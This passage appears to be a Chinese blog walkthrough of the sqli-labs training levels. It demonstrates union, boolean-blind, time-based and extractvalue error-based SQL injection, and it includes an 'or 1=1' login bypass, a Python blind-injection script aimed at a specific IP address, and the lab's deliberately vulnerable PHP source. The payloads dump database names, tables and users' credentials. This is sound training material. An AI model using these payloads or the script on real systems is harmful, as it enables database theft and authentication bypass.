<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>MySQL返回的是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">|  1 | 2        | 3        |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>但因为后端代码的设计，只能显示第一条，这时候我们可以让前面id指向一个不存在的数据,这样第一条数据就只会返回空</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,2,3; </span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | 2        | 3        |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p><img src="/images/sql/12.png"></p>
<h3 id="开始爆金币数据了"><a href="#开始爆金币数据了" class="headerlink" title="开始爆金币数据了"></a>开始爆<del>金币</del>数据了</h3><blockquote>
<p>?id&#x3D;-1’ union select 1,(select username from users limit 4,1),3  –+</p>
</blockquote>
<p>因为<code>select username from users</code>会返回多条数据，这时候使用<code>limit</code>来限制返回哪一行</p>
<p><img src="/images/sql/13.png"></p>
<p>这样子爆破数据不够爽，还得手动一个一个搓，太麻烦了,直接上<code>group_concat()</code></p>
<blockquote>
<p>?id&#x3D;-1’ union select 1,(select group_concat(username) from users),3 –+</p>
</blockquote>
<p><img src="/images/sql/14.png"></p>
<p>不过这是咱在翻看了源代码，并且知道这些数据的情况下做出来的，在真正注入的环境下，得需要获取这些数据，这时候就需要<code>information_schema</code>这个数据库了</p>
<blockquote>
<p>?id&#x3D;-1’ union select 1,(select group_concat(schema_name) from schemata),3 –+</p>
</blockquote>
<p><img src="/images/sql/15.png"><br>发生什么事了？好像有点不太对劲呢。因为这题所在的数据库是<code>security</code>，而<code>schemata</code>是在<code>information_schema</code>这个数据库下面的。我们需要换成<code>information_schema.schemata</code></p>
<blockquote>
<p>?id&#x3D;-1’ union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+  </p>
</blockquote>
<p><img src="/images/sql/16.png"></p>
<p>数据库爆出来了，爆表名</p>
<blockquote>
<p>?id&#x3D;-1’ union select 1,(select group_concat(table_name) from information_schema.columns where table_schema&#x3D;”security”),3 –+</p>
</blockquote>
<p><img src="/images/sql/17.png"></p>
<p>表名出来了，爆字段</p>
<blockquote>
<p>?id&#x3D;-1’ union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;”users”),3 –+</p>
</blockquote>
<p><img src="/images/sql/18.png"></p>
<p>需要的数据都有了，咱可以直接把库给脱下来了</p>
<h2 id="Less-2-Less-4"><a href="#Less-2-Less-4" class="headerlink" title="Less-2 - Less-4"></a>Less-2 - Less-4</h2><p>这几题都一样，无非是注入点周围包裹的东西不一样，不多赘述，过。</p>
<h2 id="Less-5-布尔盲注"><a href="#Less-5-布尔盲注" class="headerlink" title="Less-5 | 布尔盲注"></a>Less-5 | 布尔盲注</h2><blockquote>
<p>?id&#x3D;1</p>
</blockquote>
<p><img src="/images/sql/19.png"></p>
<p>眉清目秀，啥都木有。</p>
<blockquote>
<p>?id&#x3D;1”‘<br>一通测试下来，发现有了报错信息<br><img src="/images/sql/20.png"></p>
</blockquote>
<p>如何利用报错信息注入呢？</p>
<blockquote>
<p>?id&#x3D;1’ and 1 &#x3D; 1 –+<br>i<a href="images/sql/21.png"></a></p>
</blockquote>
<blockquote>
<p>?id&#x3D;2’ and 2 &#x3D; 1 –+<br><img src="/images/sql/22.png"></p>
</blockquote>
<p>那有意思的就来了，嘻嘻</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ((substr(group_concat((select group_concat(schema_name) from information_schema.schemata)),1,1))=0);</span><br><span class="line">+-----------------------------------------------------------------------------------------------------+</span><br><span class="line">| ((substr(group_concat((select group_concat(schema_name) from information_schema.schemata)),1,1))=0) |</span><br><span class="line">+-----------------------------------------------------------------------------------------------------+</span><br><span class="line">|                                                                                                   1 |</span><br><span class="line">+-----------------------------------------------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>爆数据库</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://39.104.82.167/Less-5/?id=&quot;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">            payload = <span class="string">f&quot;1&#x27; and ascii(substr((select group_concat(schema_name) from information_schema.schemata),<span class="subst">&#123;j&#125;</span>,1)) = <span class="subst">&#123;k&#125;</span> --+&quot;</span></span><br><span class="line">            r = requests.get(url+payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                res += <span class="built_in">chr</span>(k)</span><br><span class="line">                <span class="built_in">print</span>(res)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/sql/23.png"></p>
<p>更改payload来爆表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = f&quot;1&#x27; and ascii(substr((select group_concat(table_name) from information_schema.columns where table_schema=\&quot;security\&quot;),&#123;j&#125;,1)) = &#123;k&#125; --+&quot;</span><br></pre></td></tr></table></figure>

<p>更改payload 来爆字段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = f&quot;1&#x27; and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),&#123;j&#125;,1)) = &#123;k&#125; --+&quot;</span><br></pre></td></tr></table></figure>

<p><strong>Tips 无AND的情况下，可以用<code>^</code></strong></p>
<h2 id="Less-6-8-都差不多，就是需要各种奇妙的闭合"><a href="#Less-6-8-都差不多，就是需要各种奇妙的闭合" class="headerlink" title="Less 6-8 都差不多，就是需要各种奇妙的闭合"></a>Less 6-8 都差不多，就是需要各种奇妙的闭合</h2><p>略</p>
<h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less 9"></a>Less 9</h2><p>这里需要时间盲注，和布尔盲注差不多只是需要添加一个if(a,sleep(10),1)判断</p>
<blockquote>
<p>?id&#x3D;1’ and if(1&#x3D;1,sleep(5),1)–+</p>
</blockquote>
<p>判断参数构造。</p>
<blockquote>
<p>?id&#x3D;1’and if(length((select database()))&gt;9,sleep(5),1)–+</p>
</blockquote>
<p>判断数据库名长度</p>
<blockquote>
<p>?id&#x3D;1’and if(ascii(substr((select database()),1,1))&#x3D;115,sleep(5),1)–+</p>
</blockquote>
<p>逐一判断数据库字符</p>
<blockquote>
<p>?id&#x3D;1’and if(length((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))&gt;13,sleep(5),1)–+</p>
</blockquote>
<p>判断所有表名长度</p>
<blockquote>
<p>?id&#x3D;1’and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1))&gt;99,sleep(5),1)–+</p>
</blockquote>
<p>逐一判断表名</p>
<blockquote>
<p>?id&#x3D;1’and if(length((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’))&gt;20,sleep(5),1)–+</p>
</blockquote>
<p>判断所有字段名的长度</p>
<blockquote>
<p>?id&#x3D;1’and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),1,1))&gt;99,sleep(5),1)–+</p>
</blockquote>
<p>逐一判断字段名。</p>
<blockquote>
<p>?id&#x3D;1’ and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)–+</p>
</blockquote>
<p>判断字段内容长度</p>
<blockquote>
<p>?id&#x3D;1’ and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)–+</p>
</blockquote>
<p>逐一检测内容。</p>
<h2 id="Less-10-一模一样，略"><a href="#Less-10-一模一样，略" class="headerlink" title="Less 10 一模一样，略"></a>Less 10 一模一样，略</h2><h2 id="Less-11-万能密码"><a href="#Less-11-万能密码" class="headerlink" title="Less 11 | 万能密码"></a>Less 11 | 万能密码</h2><p>这次开始，不是get传参了，换成POST传参还给了个登录框，先随便穿个数据康康<br><img src="/images/sql/25.png"></p>
<p>这时候拿出我们的究极无敌炫酷万能密码<code>1&#39; or 1=1#</code><br><img src="/images/sql/26.png"></p>
<p>好了，这就进去了</p>
<p>为什么呢？咱把源码翻开</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line">	<span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">	<span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;User Name:&#x27;</span>.<span class="variable">$uname</span>);</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;Password:&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// connectivity </span></span><br><span class="line">	@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">	<span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>); <span class="comment">//注意这里</span></span><br><span class="line">	<span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  		<span class="comment">//echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;;	</span></span><br><span class="line">  		</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line">		<span class="comment">//echo &quot; You Have successfully logged in\n\n &quot; ;</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;	</span><br><span class="line">		</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span>  </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">		<span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line">		<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;</span>;	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>关键点在这里<code>$result=mysql_query($sql);</code></p>
<p>这里的结果是用sql语句的查询结果来，所以只需要让语句返回一个真就行了，<code>or 1 = 1</code>使得整个语句恒真，这就让我们成功登陆进去了</p>
<p>之后我们就可以注入获取信息了。</p>
<h2 id="Less-12-16-都差不多"><a href="#Less-12-16-都差不多" class="headerlink" title="Less 12 -16 都差不多"></a>Less 12 -16 都差不多</h2><p>略</p>
<h2 id="Less-17-报错注入"><a href="#Less-17-报错注入" class="headerlink" title="Less 17 | 报错注入"></a>Less 17 | 报错注入</h2><p>这题开始不同了，使用的是<code>update</code>而不是<code>select</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		<span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		<span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line"><span class="variable">$uname</span>=<span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);  </span><br><span class="line"></span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;User Name:&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;New Password:&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="comment">//echo $row;</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  		<span class="comment">//echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;;	</span></span><br><span class="line">		<span class="variable">$row1</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];  	</span><br><span class="line">		<span class="comment">//echo &#x27;Your Login name:&#x27;. $row1;</span></span><br><span class="line">		<span class="variable">$update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;<span class="subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$update</span>);</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">mysql_error</span>())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">			<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">			<span class="comment">//echo &quot; You password has been successfully updated &quot; ;		</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag1.jpg&quot;   /&gt;&#x27;</span>;	</span><br><span class="line">		<span class="comment">//echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];</span></span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span>  </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">		<span class="comment">//echo &quot;Bug off you Silly Dumb hacker&quot;;</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap1.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>报错注入开淦</p>
<h3 id="能进行报错的函数"><a href="#能进行报错的函数" class="headerlink" title="能进行报错的函数"></a>能进行报错的函数</h3><h4 id="extractvalue-1"><a href="#extractvalue-1" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><ul>
<li>演示: <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select extractvalue(1,concat(0x5c,&quot;114514&quot;,0x5c));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;\114514\&#x27;</span><br><span class="line"></span><br><span class="line">``` </span><br><span class="line">* payload:</span><br></pre></td></tr></table></figure>
1’ and (extractvalue(1,concat(0x5c,version(),0x5c)))#    爆版本</li>
</ul>
<p>1’ and (extractvalue(1,concat(0x5c,database(),0x5c)))#   爆数据库</p>
<p>1’ and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x5c)))#   爆表名</p>
<p>1’ and (extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),0x5c)))#<br> 爆字段名</p>
<p>1’ and (extractvalue(1,concat(0x5c,(select password from (select password from users where username&#x3D;’admin1’) b) ,0x5c)))#      爆字段内容该格式针对mysql数据库。</p>
<p>1’ and (extractvalue(1,concat(0x5c,(select group_concat(username,password) from users),0x5c)))#                      爆字段内容。</p>
